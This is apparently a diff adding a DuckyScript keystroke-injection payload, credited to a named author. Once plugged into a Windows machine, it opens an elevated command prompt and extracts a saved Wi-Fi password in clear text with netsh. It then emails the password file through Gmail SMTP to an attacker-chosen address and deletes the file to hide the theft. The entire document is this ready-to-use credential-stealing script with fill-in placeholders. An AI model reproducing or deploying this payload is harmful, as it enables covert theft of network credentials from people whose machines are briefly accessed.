@@ -1,0 +1,70 @@
+REM AUTHOR: ELIJAH CANNON
+REM REPLACE: 'NAME' with SSID, 'from' with your email you're sending from, 'password' with your email password, and 
+REM 'to' with email you are sending to.
+REM DETAILS: Opens cmd(Admin), obtains wifi password, and saves it to a txt file. 
+REM Opens Powershell, and sends file through SMPT(email). Exits Powershell. 
+REM Deletes txt file in cmd. Exits cmd.
+DELAY 2500
+GUI x
+DELAY 100
+STRING a
+DELAY 500
+LEFTARROW
+DELAY 300
+ENTER
+DELAY 500
+REM ---------------------------Replace 'NAME' with SSID(Name of Wi-fi)
+STRING netsh wlan show profile NAME key=clear | findstr Key > C:\wifiPassword.txt
+DELAY 100
+ENTER
+DELAY 500
+REM ----------Send through Email
+GUI r
+DELAY 100
+STRING powershell
+DELAY 100
+ENTER
+DELAY 1000
+STRING $SMTPServer = 'smtp.gmail.com'
+ENTER
+STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
+ENTER
+STRING $SMTPInfo.EnableSsl = $true
+ENTER
+STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('from@gmail.com', 'password');
+ENTER
+STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
+ENTER
+STRING $ReportEmail.From = 'from@gmail.com'
+ENTER
+STRING $ReportEmail.To.Add('to@gmail.com')
+ENTER
+STRING $ReportEmail.Subject = 'Wi-fi Password'
+ENTER
+STRING $ReportEmail.Body = 'Attached is a file containing the wifi password'
+ENTER
+STRING $ReportEmail.Attachments.Add('c:\wifiPassword.txt')
+ENTER
+STRING $SMTPInfo.Send($ReportEmail)
+ENTER
+DELAY 3000
+STRING exit
+DELAY 100
+ENTER
+DELAY 500
+STRING cd ..
+DELAY 100
+ENTER
+DELAY 500
+STRING cd ..
+DELAY 100
+ENTER
+DELAY 500
+STRING del wifiPassword.txt
+DELAY 100
+ENTER
+DELAY 500
+DELAY 1000
+STRING exit
+DELAY 100
+ENTER
